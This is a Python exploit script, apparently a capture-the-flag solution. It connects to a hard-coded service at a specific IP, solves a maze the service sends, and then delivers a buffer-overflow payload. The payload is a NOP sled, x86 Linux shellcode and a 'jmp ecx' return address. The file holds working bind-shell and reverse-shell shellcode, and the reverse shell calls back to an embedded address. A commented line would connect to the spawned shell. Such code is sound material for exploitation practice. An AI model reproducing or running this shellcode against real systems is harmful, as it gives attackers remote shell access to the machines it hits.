#!/bin/python3

import os, sys
import socket, errno
from time import sleep

maze_size = 3741
conn = ('104.236.116.183', 9000)

def shellcode():

    bind_shell = \
        b"\x31\xc0\x89\xc3\x50\xb0\x66\xb3\x01\x6a\x01\x6a\x02\x89\xe1\xcd" + \
        b"\x80\x89\xc2\x31\xc0\xb0\x66\x5b\x59\x66\x68\x11\x5c\x66\x53\x89" + \
        b"\xe1\x6a\x10\x51\x52\x89\xe1\xcd\x80\x50\xb0\x66\xb3\x04\x52\x89" + \
        b"\xe1\xcd\x80\x50\x50\x52\xb0\x66\xb3\x05\x89\xe1\xcd\x80\x89\xc3" + \
        b"\x31\xc9\xb1\x02\xb0\x3f\xcd\x80\x49\x79\xf9\x31\xc0\x50\x68\x2f" + \
        b"\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b" + \
        b"\xcd\x80" # bind 4444

    rev2 = \
        b"\x6a\x66\x58\x6a\x01\x5b\x31\xd2\x52\x53\x6a\x02\x89\xe1\xcd\x80" + \
        b"\x92\xb0\x66\x68\x4E\x33\x94\x76\x66\x68\xd6\xd9\x43\x66\x53\x89" + \
        b"\xe1\x6a\x10\x51\x52\x89\xe1\x43\xcd\x80\x6a\x02\x59\x87\xda\xb0" + \
        b"\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x41\x89\xca\x52\x68\x2f\x2f\x73" + \
        b"\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80";

    shellcode  = b''
    shellcode += b'\x90'*( 200 - len(rev2)) # nopsled
    shellcode += rev2 # shellcode
    shellcode += b'\x90'*72 # nopsled
    shellcode += b'\xd3\x79\x0b\x08' # jmp ecx

    return shellcode

def connect_sock():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect(conn); sock.setblocking(False)

    return sock

def read_sock(sock, size):
    data = b""

    while len(data) < size:
        try:
            data += sock.recv(4096)
        except IOError as e:
            sleep(.2)
            if e.args[0] == errno.EAGAIN:
                continue
            else:
                print(e)
                sys.exit(0)

    return data

def solve_maze(y, x, maze):

    try:
        if maze[y][x] == 2:
            return ""
        elif maze[y][x] == 1:
            return "E"
        elif maze[y][x] == 3:
            return "E"
    except IndexError:
        return "E"

    maze[y][x] = 3

    ret = solve_maze(y+1, x, maze)
    if ret != "E": return "s" + ret

    ret = solve_maze(y, x-1, maze)
    if ret != "E": return "a" + ret

    ret = solve_maze(y-1, x, maze)
    if ret != "E": return "w" + ret

    ret = solve_maze(y, x+1, maze)
    if ret != "E": return "d" + ret

    return "E"

def parse_maze(data):

    maze = []

    for y in range(43):
        xa = []
        for x in range(43):
            rx = (y*87) + (x*2)
            sym = data[rx:rx+2]

            if sym == b"[]":
                xa.append(1)
            elif sym == b"  " or sym == b"<>":
                xa.append(0)

        maze.append(xa)

    maze[42][41] = 2

    return maze

if __name__ == "__main__":

    sock = connect_sock()
    data = read_sock(sock, maze_size)

    maze = parse_maze(data)
    solve = solve_maze(0, 1, maze)

    print(data.decode())
    sock.send(solve.encode())

    recv_len = (len(solve) - 1) * maze_size + 56
    data = read_sock(sock, recv_len)

    print(data.decode())
    sock.send(shellcode())

    print("Dropping to shell ... ACTIVE\n")
    #os.system("nc " + conn[0] + " 4444")
